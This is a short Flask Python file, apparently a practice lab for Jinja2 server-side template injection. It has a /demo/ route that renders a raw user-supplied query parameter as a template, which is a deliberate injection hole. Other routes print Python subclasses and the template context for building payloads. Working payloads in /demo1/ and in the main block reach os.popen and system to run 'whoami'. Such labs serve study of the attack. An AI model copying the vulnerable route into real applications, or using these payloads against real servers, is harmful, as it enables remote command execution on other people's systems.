import traceback

from flask import Flask, render_template, request, render_template_string
from jinja2 import Template
import jinja2

app = Flask(__name__)


@app.route('/')
def main():
    return render_template('index.html',
                           title='My Page',
                           heading='Welcome to My Page',
                           items=['Apple', 'Banana', 'Orange', 'wi1shu'])


@app.route('/subclasses/')
def subclass():
    subclasses = []

    # 获取所有子类的名称
    for i in ''.__class__.__mro__[-1].__subclasses__():
        subclasses.append(str(i))

    # 创建Jinja2模板
    template_str = """
    {% for num, subclass in subclasses %}
        {{ num }} ----------> {{ subclass }}<br>
    {% endfor %}
    """

    # 渲染模板并传递数据
    return render_template_string(template_str, subclasses=enumerate(subclasses, 0))


@app.route('/template_context/')
def template_context():

    # 创建Jinja2模板
    template_str = """
    {% for name, class in self.__dict__._TemplateReference__context.items() %}
        {{ name|string }} -------------------> {{ class |string }}<br><br>
    {% endfor %}
    """

    # 渲染模板并传递数据
    return render_template_string(template_str)


@app.route('/demo/', methods=['GET'])
def demo():
    payload = request.args.get('payload')
    if payload:
        return render_template_string(payload)
    else:
        return 'Hello World!'


@app.route('/demo1/')
def demo1():
    payload = Template('''
        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
            {% set wi1 = i.__init__.__globals__['popen']('whoami').read() %} 
            {{wi1}}
        {% endfor %}
    ''').render()
    return payload


if __name__ == '__main__':
    try:
        print(Template('''
        {{ [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami') }}
        ''').render())
    except Exception:
        print(traceback.format_exc())

    app.run(host='127.0.0.1', port=50000)
